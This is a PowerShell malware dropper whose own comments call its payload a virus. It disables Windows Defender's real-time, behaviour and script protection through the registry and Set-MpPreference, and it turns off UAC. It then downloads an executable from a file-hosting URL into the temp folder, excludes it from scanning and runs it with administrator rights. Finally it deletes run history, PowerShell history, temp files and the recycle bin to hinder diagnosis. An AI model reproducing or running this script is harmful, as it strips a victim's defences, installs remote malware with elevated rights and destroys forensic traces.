#Totally dismantle WD trough registry and configure it so it becomes retarded if its enabled, it wont even boot upon startup.
# mess with windows defender trough registry
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\PUAProtection" -Name DisablePUAProtection -Value 1 -PropertyType DWORD -Force

#make windows difender turn a blind eye to every threat level
Set-MpPreference -HighThreatDefaultAction 0
Set-MpPreference -ModerateThreatDefaultAction 0
Set-MpPreference -LowThreatDefaultAction 0
Set-MpPreference -SevereThreatDefaultAction 0
#now a bunch of other things, some of these are not needed anyway because registry disables them but whatever
Set-MpPreference -ScanScheduleDay 255
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -PUAProtection 2
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableOnAccessProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -EnableControlledFolderAccess 0
Set-MpPreference -EnableSmartScreen 0
#defender is totally permanently disabled, unless the infected pc goes trough the most tedious process ever to fully enable it again
# to ensure stability of the .exe running. we will disable UAC so when you run it as administrator it wont prompt.
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
#im pretty sure everything is put down now..

#now, download the executable virus using cURL (Invoke-WebRequest)
$url = "https://s10download.krakenfiles.com/force-download/MjgyY2NhYjk1ZGFiNGIyODm6asU_hAn4dtslxbMtMM4eH7elC88B8gQIi4EzuUzl/LsEgwTTSuI"

# Set the path for the temporary folder
$tempFolder = [System.IO.Path]::GetTempPath()

# Set the output file path
$outputFile = Join-Path -Path $tempFolder -ChildPath "orkideoppdatering.exe"

# Download
Invoke-WebRequest -Uri $url -OutFile $outputFile

#add exclusion in windows defender, totally not needed as it is fully disabled but whatever..
Add-MpPreference -ExclusionPath "$outputfile"

#now execute the virus with highest priveleges.
Start-Process -FilePath "$outputfile" -Verb RunAs

Start-sleep -Seconds 7

#sleep to ensure .exe finished executing, now initialize cleanup.

# Clear Run box history
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name *

# Delete PowerShell history file
Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

# Clear contents of the temporary directory (including the .exe so they cant diagnose it)
Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue

start-sleep -seconds 4

# Empty the recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue





